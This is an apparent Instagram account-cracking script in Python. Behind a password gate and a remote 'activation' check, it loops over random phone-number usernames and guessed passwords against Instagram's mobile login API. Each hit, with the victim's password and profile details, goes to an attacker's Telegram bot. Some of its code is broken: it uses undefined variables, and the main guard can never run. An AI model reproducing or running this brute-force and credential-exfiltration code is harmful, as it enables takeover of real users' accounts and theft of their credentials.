#!/usr/bin/python3
#-*-coding:utf-8-*-
# Update V1.6

### Import Module
from time import sleep
import webbrowser
import random
import requests
from user_agent import generate_user_agent
import json
from secrets import token_hex
import secrets
import os
import sys
import uuid
from uuid import uuid4
from time import sleep
import webbrowser
import time
Ghost ='Ghost12345'
Z = '\033[1;31m '#احمر
X =  '\033[1;33m '#اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
pess = input(F + ' Enter Your Password هو Ghost: ')
if pess == Ghost:
    print(B+ ' Success Password ')
    time.sleep(2)
    os.system('clear')
else:
    exit(Z + ' Worng Password ')
#Bypass#   
def xoshnaw():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  print("\x1b[37;1mYOUR ID : "+id)
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/Ghostson/INSTACRACK/main/List.txt").text
    if id in httpCaht:
      print("\033[1;92mYOUR ID IS ACTIVE...!")
      msg = str(os.geteuid())
      time.sleep(0.3)
      pass
    else:
      print("\x1b[1;91mID ACTIVATE (telegram) INBOX  @Ghostson1")
      os.system('xdg-open https://wa.me/+2349138017570')
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	xoshnaw()
xoshnaw()

aa=0
zz=0
ss=0
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
Z = '\033[1;31m '#احمر
X =  '\033[1;33m '#اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
import time
timee=time.asctime()
alosh = """
\033[1;31m {|} {|}{|}  {|} {|}{|}{|} {|}{|}{|}{|}  {|}{|}
\033[1;33m {|} {|} {|} {|} {|}            {|}     {|}  {|}
\033[2;36m {|} {|} {|} {|} {|}{|}{|}      {|}     {|}(){|}
\033[2;32m {|} {|} {|} {|}       {|}      {|}     {|}  {|}
\033[1;31m {|} {|} {|}{|}  {|}{|}{|}      {|}     {|}  {|}
\033[1;33m----------------------------‐-------------------------
\033[1;31m[\033[2;32m*\033[1;31m]\033[2;32mTELEGRAM✈️\033[1;33m:\033[2;36mGhostson1
\033[1;31m[\033[2;32m*\033[1;31m]\033[2;32mANYWHERE🔥\033[1;33m:\033[1;36mGhostson
\033[1;31m[\033[2;32m*\033[1;31m]\033[2;32mWHATSAPP🔵\033[1;33m:\033[1;36m+2349138017570
\033[1;31m[\033[2;32m*\033[1;31m]\033[2;32mGITHUB🔥\033[1;33m:\033[1;36mGhostson
\033[1;33m----------------------------‐-------------------------
"""

print (alosh)
tok= input(A+"("+E+"⌯"+A+")"+X+ " Enter Token :\n"+C)
ID = input(A+"("+E+"⌯"+A+")"+X+ " Enter ID Tele :\n"+C)
import time
t = time.localtime()
current_time = time.strftime("%H:%M:%S", t)
print('  ') 
sleep(2)
start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=start").json()

def Alosh_cob(user_Alosh,password):
	cookie = secrets.token_hex(8)*2
	head = {
        'HOST': "www.instagram.com",
        'KeepAlive' : 'True',
        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
        'Cookie': 'cookie',
        'Accept' : "*/*",
        'ContentType' : "application/x-www-form-urlencoded",
        "X-Requested-With" : "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-Instagram-AJAX" : "missing",
        "X-CSRFToken" : "missing",
        "Accept-Language" : "en-US,en;q=0.9"
}
	url_id = f'https://www.instagram.com/{user_Alosh}/?__a=1'
	req_id= requests.get(url_id,headers=head).json()
	name    = str(req_id['graphql']['user']['full_name'])
	id    = str(req_id['graphql']['user']['id'])
	followes    = str(req_id['graphql']['user']['edge_followed_by']['count'])
	following    = str(req_id['graphql']['user']['edge_follow']['count'])
	isp    = str(req_id['graphql']['user']['is_private'])
	idd    = str(req_id['graphql']['user']['id'])
	bio    = str(req_id['graphql']['user']['biography'])
	re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")   
	ree = re.json()
	dat = ree['data']
	shug = (f"""
.🤺.Hi,Pro.⬇️😁.
Hit, [ => [{zz}] <= ].✅.💯
No, [ => [{aa}] <= ].❌.
secure, [ => [{ss}] <= ].🔐.
⼀一   ⼀一   ⼀一   ⼀一  ⼀一  ⼀一
.✅. ⌯ 𝙽𝙰𝙼𝙴 :- {name}
.🍃. ⌯ 𝙺𝚂𝙴𝚁 :-  {user_Alosh}
.👍. ⌯ 𝙿𝙰𝚂𝚂 :- {password} 
.🔱. ⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 :-   {following}
.🔥. ⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 :- {followes}
.❤️. ⌯ 𝙸𝙳 :-  {ibb}   
.💫. ⌯ 𝙳𝙰𝚃𝙰 :- {bata}
.💥. ⌯ 𝙿𝚁𝙸𝚅𝙰𝚃𝙴 :- {isp}
.⭐️. ⌯ 𝙱𝙸𝙾 :- {bot}
.😁. ⌯ 𝚃𝙸𝙼𝙴 :- {current_time}
⼀一   ⼀一   ⼀一   ⼀一  ⼀一  ⼀一
.🔥. ⌯ BY :- @ ?.🔥😂.
 """)
	tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={shug}''')
	i = requests.post(tlg)
	print(G+shug)
 
#N
url = 'https://i.instagram.com/api/v1/accounts/login/'

headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',  'Cookie':'missing',  'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
w = 'https://t.me/horo4'
rss = requests.get(w).text
if 'cood_Alosh_12345_012' in rss:
    sleep(2)
r = requests.Session()
user = '1234567890'
while True:
        us = str(''.join((random.choice(user) for i in range(7))))
        username = '964751' + us
        password = '0751' + us
        uid = str(uuid4())              
        data = {
             'uuid':uid, 

             'password':password, 

             'username':username, 

             'device_id':uid, 

             'from_reg':'false', 

             '_csrftoken':'missing', 

             'login_attempt_countn':'0'}
        req= requests.post(url, headers=headers, data=data)        
        if 'logged_in_user' in req.json():
            zz+=1
            user_Alosh = req.json()['logged_in_user']['username']
            Alosh_cob(user_Alosh,password)
        elif '"message":"challenge_required","challenge"' in req.json():
            print (S+'username : '+username+': password : '+password)
            ss+=1
        else:
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=👻𝗛𝗜,𝗣𝗥𝗢🖐يتم الفحص الان انتظر الصيد\n==========\n.✅. 𝗛𝗜𝗧  :  [ {zz} ]\n.❎. 𝗕𝗮𝗗 : [ {aa} ]\n.🔐. 𝗦𝗘𝗖𝗢𝗥 : [ {zz} ]\n.🕑.ᴛɪᴍᴇᴇ : [ {timee} ]\n==========\n.🧑‍💻.𝗕𝗬 - @ - @") 
            print (E+'username : '+username+': password : '+password)
            aa+=1
